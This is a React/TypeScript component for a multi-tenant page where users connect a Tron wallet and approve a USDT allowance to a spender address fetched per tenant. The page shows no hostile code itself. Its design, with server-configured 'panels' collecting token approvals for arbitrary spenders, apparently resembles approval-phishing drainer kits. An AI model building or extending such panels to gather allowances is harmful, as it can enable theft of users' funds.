import { useEffect, useState } from 'react'
import { useAppKitAccount } from '@reown/appkit/react'
import { ApprovePanel } from './components/ApprovePanel'
import { ConnectCard } from './components/ConnectCard'
import { setTenant } from './lib/tenant'

const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/

type TenantMeta = {
  id: string
  name: string
  description: string
  url: string | null
  spender: string
}

export default function TenantPage({ tenantId }: { tenantId: string }) {
  const [tenant, setTenantMeta] = useState<TenantMeta | null>(null)
  const [error, setError] = useState<string | null>(null)
  const { address, isConnected } = useAppKitAccount({ namespace: 'tron' })
  const hasTronAccount = isConnected && Boolean(address && TRON_ADDRESS_RE.test(address))

  // Set during render so the API layer is scoped before any child effect runs.
  setTenant(tenantId)

  useEffect(() => {
    let active = true

    fetch(`/api/tenant/${tenantId}`)
      .then(async (res) => {
        if (!res.ok) throw new Error((await res.json().catch(() => ({}))).error ?? 'Unknown panel.')
        return (await res.json()) as TenantMeta
      })
      .then((data) => {
        if (!active) return
        setTenantMeta(data)
        document.title = data.name
      })
      .catch((err) => {
        if (active) setError(err instanceof Error ? err.message : 'Unknown panel.')
      })

    return () => {
      active = false
      setTenant(null)
    }
  }, [tenantId])

  if (error) {
    return (
      <main className="card">
        <header className="brand">
          <div className="brand-text">
            <h1>Panel unavailable</h1>
            <p className="sub">{error}</p>
          </div>
        </header>
      </main>
    )
  }

  return (
    <main className="card">
      <header className="brand">
        <span className="brand-mark">
          <img src="/icon.svg" alt="" />
        </span>
        <div className="brand-text">
          <h1>{tenant?.name ?? 'Loading…'}</h1>
          <p className="sub">{tenant?.description ?? 'USDT approval'}</p>
        </div>
        <span className="net-pill">
          <span className="dot" />
          Mainnet
        </span>
      </header>

      <ConnectCard />
      {hasTronAccount && <ApprovePanel />}

      <p className="footnote">
        Non-custodial · allowance to <code>{tenant?.spender ?? '…'}</code>
      </p>
    </main>
  )
}
